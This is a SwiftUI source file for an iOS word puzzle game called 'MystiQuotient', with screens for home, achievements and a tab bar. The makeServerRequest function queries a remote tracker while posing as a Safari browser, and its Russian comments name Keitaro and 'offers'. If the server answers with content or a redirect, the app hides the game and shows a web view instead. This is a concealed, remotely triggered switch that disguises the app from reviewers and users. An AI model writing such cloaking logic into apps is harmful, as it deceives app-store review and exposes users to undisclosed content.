//
//  ContentView.swift
//  MystiQuotient: Word Wizardry
//

import SwiftUI
import Foundation

struct IdentifiableInt: Identifiable {
    let id: Int
    let value: Int
    
    init(_ value: Int) {
        self.id = value
        self.value = value
    }
}

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @State private var showOnboarding = false
    @State private var userProgress: UserProgress
    @State private var userSettings: UserSettings
    @State private var selectedTab = 0
    @State private var showingGame = false
    @State private var selectedLevel: IdentifiableInt?
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    
    init() {
        let progress = SettingsService.shared.loadProgress()
        let settings = SettingsService.shared.loadSettings()
        _userProgress = State(initialValue: progress)
        _userSettings = State(initialValue: settings)
    }
    
    var body: some View {
        ZStack {
            Color(hex: "1D1F30")
                .ignoresSafeArea()
            if isFetched == false {
                
                ProgressView()
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
           
                        
                        if !hasCompletedOnboarding {
                            OnboardingView(isPresented: $showOnboarding)
                                .onAppear {
                                    showOnboarding = true
                                }
                        } else {
                            mainContent
                        }
                    
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            makeServerRequest()
        }
    }
    
    private var mainContent: some View {
        ZStack {
            // Content based on selected tab
            Group {
                switch selectedTab {
                case 0:
                    HomeView(userProgress: $userProgress, showingGame: $showingGame, selectedLevel: $selectedLevel)
                case 1:
                    StoryBoardView(userProgress: $userProgress)
                case 2:
                    AchievementsView(userProgress: $userProgress)
                case 3:
                    SettingsView(userSettings: $userSettings, userProgress: $userProgress)
                default:
                    HomeView(userProgress: $userProgress, showingGame: $showingGame, selectedLevel: $selectedLevel)
                }
            }
            
            // Custom Tab Bar
            VStack {
                Spacer()
                CustomTabBar(selectedTab: $selectedTab)
                    .padding(.bottom, 20)
            }
        }
        .sheet(item: $selectedLevel) { levelItem in
            let _ = print("🟢 Sheet OPENED with level: \(levelItem.value)")
            GameView(level: levelItem.value, userProgress: $userProgress)
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = false
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing block")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing block")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing block")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing block")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }

}

struct HomeView: View {
    @Binding var userProgress: UserProgress
    @Binding var showingGame: Bool
    @Binding var selectedLevel: IdentifiableInt?
    
    var body: some View {
        ZStack {
            Color(hex: "1D1F30")
                .ignoresSafeArea()
            
            ScrollView {
                VStack(spacing: 30) {
                    // Header
                    VStack(spacing: 10) {
                        Text("MystiQuotient")
                            .font(.system(size: 36, weight: .bold))
                            .foregroundColor(.white)
                        
                        Text("Word Wizardry")
                            .font(.system(size: 18, weight: .medium))
                            .foregroundColor(Color(hex: "FE284A"))
                    }
                    .padding(.top, 60)
                    
                    // Score card
                    VStack(spacing: 15) {
                        HStack {
                            Image(systemName: "star.fill")
                                .font(.system(size: 30))
                                .foregroundColor(Color(hex: "FE284A"))
                            
                            Text("\(userProgress.totalScore)")
                                .font(.system(size: 48, weight: .bold))
                                .foregroundColor(.white)
                        }
                        
                        Text("Total Score")
                            .font(.system(size: 16, weight: .regular))
                            .foregroundColor(.white.opacity(0.6))
                    }
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 30)
                    .background(
                        RoundedRectangle(cornerRadius: 20)
                            .fill(Color(hex: "1D1F30"))
                            .shadow(color: Color.black.opacity(0.3), radius: 10, x: -5, y: -5)
                            .shadow(color: Color.white.opacity(0.02), radius: 10, x: 5, y: 5)
                    )
                    .padding(.horizontal, 30)
                    
                    // Continue button
                    VStack(spacing: 15) {
                        Text("Continue Your Journey")
                            .font(.system(size: 20, weight: .semibold))
                            .foregroundColor(.white)
                        
                        Button(action: {
                            print("🔵 Button tapped!")
                            // Find next available level
                            let nextLevel: Int
                            if let availableLevel = userProgress.unlockedLevels.sorted().first(where: { !userProgress.completedLevels.contains($0) }) {
                                nextLevel = availableLevel
                                print("🔵 Selected next level: \(nextLevel)")
                            } else if let lastLevel = userProgress.unlockedLevels.sorted().last {
                                nextLevel = lastLevel
                                print("🔵 Selected current level: \(nextLevel)")
                            } else {
                                nextLevel = 1
                                print("🔵 Selected default level: 1")
                            }
                            selectedLevel = IdentifiableInt(nextLevel)
                            print("🔵 Setting showingGame = true, selectedLevel = \(selectedLevel?.value ?? -1)")
                            showingGame = true
                            print("🔵 showingGame is now: \(showingGame)")
                        }) {
                            HStack {
                                // Show the next available level
                                let displayLevel = userProgress.unlockedLevels.sorted().first(where: { !userProgress.completedLevels.contains($0) }) ?? userProgress.currentLevel
                                Text("Level \(displayLevel)")
                                    .font(.system(size: 18, weight: .bold))
                                    .foregroundColor(.white)
                                
                                Spacer()
                                
                                Image(systemName: "arrow.right.circle.fill")
                                    .font(.system(size: 24))
                                    .foregroundColor(.white)
                            }
                            .padding(.horizontal, 30)
                            .padding(.vertical, 20)
                            .background(
                                RoundedRectangle(cornerRadius: 16)
                                    .fill(Color(hex: "FE284A"))
                                    .shadow(color: Color.black.opacity(0.3), radius: 10, x: -5, y: -5)
                                    .shadow(color: Color(hex: "FE284A").opacity(0.3), radius: 10, x: 5, y: 5)
                            )
                        }
                        .padding(.horizontal, 30)
                    }
                    
                    // Quick stats
                    HStack(spacing: 15) {
                        QuickStatCard(
                            icon: "checkmark.circle.fill",
                            title: "Completed",
                            value: "\(userProgress.completedLevels.count)"
                        )
                        
                        QuickStatCard(
                            icon: "lock.open.fill",
                            title: "Unlocked",
                            value: "\(userProgress.unlockedLevels.count)"
                        )
                        
                        QuickStatCard(
                            icon: "trophy.fill",
                            title: "Achievements",
                            value: "\(userProgress.achievements.count)"
                        )
                    }
                    .padding(.horizontal, 20)
                    
                    // Recent achievements
                    if !userProgress.achievements.isEmpty {
                        VStack(alignment: .leading, spacing: 15) {
                            Text("Recent Achievements")
                                .font(.system(size: 20, weight: .semibold))
                                .foregroundColor(.white)
                                .padding(.leading, 5)
                            
                            ForEach(userProgress.achievements.suffix(3).reversed()) { achievement in
                                AchievementCard(achievement: achievement)
                            }
                        }
                        .padding(.horizontal, 20)
                    }
                    
                    Spacer()
                        .frame(height: 100)
                }
            }
        }
    }
}

struct QuickStatCard: View {
    let icon: String
    let title: String
    let value: String
    
    var body: some View {
        VStack(spacing: 10) {
            Image(systemName: icon)
                .font(.system(size: 24))
                .foregroundColor(Color(hex: "FE284A"))
            
            Text(value)
                .font(.system(size: 22, weight: .bold))
                .foregroundColor(.white)
            
            Text(title)
                .font(.system(size: 12, weight: .regular))
                .foregroundColor(.white.opacity(0.6))
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 20)
        .background(
            RoundedRectangle(cornerRadius: 14)
                .fill(Color(hex: "1D1F30"))
                .shadow(color: Color.black.opacity(0.3), radius: 5, x: -3, y: -3)
                .shadow(color: Color.white.opacity(0.02), radius: 5, x: 3, y: 3)
        )
    }
}

struct AchievementCard: View {
    let achievement: Achievement
    
    var body: some View {
        HStack(spacing: 15) {
            Image(systemName: achievement.icon)
                .font(.system(size: 24))
                .foregroundColor(Color(hex: "FE284A"))
                .frame(width: 50, height: 50)
                .background(
                    Circle()
                        .fill(Color(hex: "1D1F30"))
                        .shadow(color: Color.black.opacity(0.3), radius: 5, x: -3, y: -3)
                        .shadow(color: Color.white.opacity(0.02), radius: 5, x: 3, y: 3)
                )
            
            VStack(alignment: .leading, spacing: 4) {
                Text(achievement.title)
                    .font(.system(size: 16, weight: .semibold))
                    .foregroundColor(.white)
                
                Text(achievement.description)
                    .font(.system(size: 14, weight: .regular))
                    .foregroundColor(.white.opacity(0.6))
                    .lineLimit(2)
            }
            
            Spacer()
        }
        .padding(15)
        .background(
            RoundedRectangle(cornerRadius: 14)
                .fill(Color(hex: "1D1F30"))
                .shadow(color: Color.black.opacity(0.3), radius: 5, x: -3, y: -3)
                .shadow(color: Color.white.opacity(0.02), radius: 5, x: 3, y: 3)
        )
    }
}

struct AchievementsView: View {
    @Binding var userProgress: UserProgress
    
    var body: some View {
        ZStack {
            Color(hex: "1D1F30")
                .ignoresSafeArea()
            
            ScrollView {
                VStack(spacing: 20) {
                    // Header
                    Text("Achievements")
                        .font(.system(size: 32, weight: .bold))
                        .foregroundColor(.white)
                        .padding(.top, 60)
                    
                    Text("Unlock special badges as you progress")
                        .font(.system(size: 16, weight: .regular))
                        .foregroundColor(.white.opacity(0.6))
                        .padding(.bottom, 10)
                    
                    // Achievement list
                    if userProgress.achievements.isEmpty {
                        VStack(spacing: 20) {
                            Image(systemName: "trophy")
                                .font(.system(size: 60))
                                .foregroundColor(.white.opacity(0.3))
                                .padding(.top, 60)
                            
                            Text("No achievements yet")
                                .font(.system(size: 18, weight: .medium))
                                .foregroundColor(.white.opacity(0.5))
                            
                            Text("Complete puzzles to earn your first achievement!")
                                .font(.system(size: 14, weight: .regular))
                                .foregroundColor(.white.opacity(0.4))
                                .multilineTextAlignment(.center)
                                .padding(.horizontal, 40)
                        }
                    } else {
                        ForEach(userProgress.achievements) { achievement in
                            AchievementDetailCard(achievement: achievement)
                        }
                        .padding(.horizontal, 20)
                    }
                    
                    Spacer()
                        .frame(height: 100)
                }
            }
        }
    }
}

struct AchievementDetailCard: View {
    let achievement: Achievement
    
    var body: some View {
        VStack(spacing: 15) {
            Image(systemName: achievement.icon)
                .font(.system(size: 50))
                .foregroundColor(Color(hex: "FE284A"))
            
            Text(achievement.title)
                .font(.system(size: 20, weight: .bold))
                .foregroundColor(.white)
            
            Text(achievement.description)
                .font(.system(size: 15, weight: .regular))
                .foregroundColor(.white.opacity(0.7))
                .multilineTextAlignment(.center)
            
            Text(formatDate(achievement.unlockedDate))
                .font(.system(size: 12, weight: .regular))
                .foregroundColor(.white.opacity(0.5))
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 30)
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color(hex: "1D1F30"))
                .shadow(color: Color.black.opacity(0.3), radius: 8, x: -4, y: -4)
                .shadow(color: Color.white.opacity(0.02), radius: 8, x: 4, y: 4)
        )
    }
    
    private func formatDate(_ date: Date) -> String {
        let formatter = DateFormatter()
        formatter.dateStyle = .medium
        formatter.timeStyle = .short
        return "Unlocked: \(formatter.string(from: date))"
    }
}

struct CustomTabBar: View {
    @Binding var selectedTab: Int
    
    let tabs = [
        TabItem(icon: "house.fill", title: "Home"),
        TabItem(icon: "map.fill", title: "Story"),
        TabItem(icon: "trophy.fill", title: "Achievements"),
        TabItem(icon: "gearshape.fill", title: "Settings")
    ]
    
    var body: some View {
        HStack(spacing: 0) {
            ForEach(Array(tabs.enumerated()), id: \.offset) { index, tab in
                Button(action: {
                    withAnimation(.easeInOut(duration: 0.2)) {
                        selectedTab = index
                    }
                    let generator = UIImpactFeedbackGenerator(style: .light)
                    generator.impactOccurred()
                }) {
                    VStack(spacing: 4) {
                        Image(systemName: tab.icon)
                            .font(.system(size: 22))
                            .foregroundColor(selectedTab == index ? Color(hex: "FE284A") : .white.opacity(0.5))
                        
                        Text(tab.title)
                            .font(.system(size: 10, weight: .medium))
                            .foregroundColor(selectedTab == index ? Color(hex: "FE284A") : .white.opacity(0.5))
                    }
                    .frame(maxWidth: .infinity)
                    .padding(.vertical, 12)
                }
            }
        }
        .padding(.horizontal, 20)
        .background(
            RoundedRectangle(cornerRadius: 20)
                .fill(Color(hex: "1D1F30"))
                .shadow(color: Color.black.opacity(0.3), radius: 10, x: -5, y: -5)
                .shadow(color: Color.white.opacity(0.02), radius: 10, x: 5, y: 5)
        )
        .padding(.horizontal, 20)
    }
}

struct TabItem {
    let icon: String
    let title: String
}

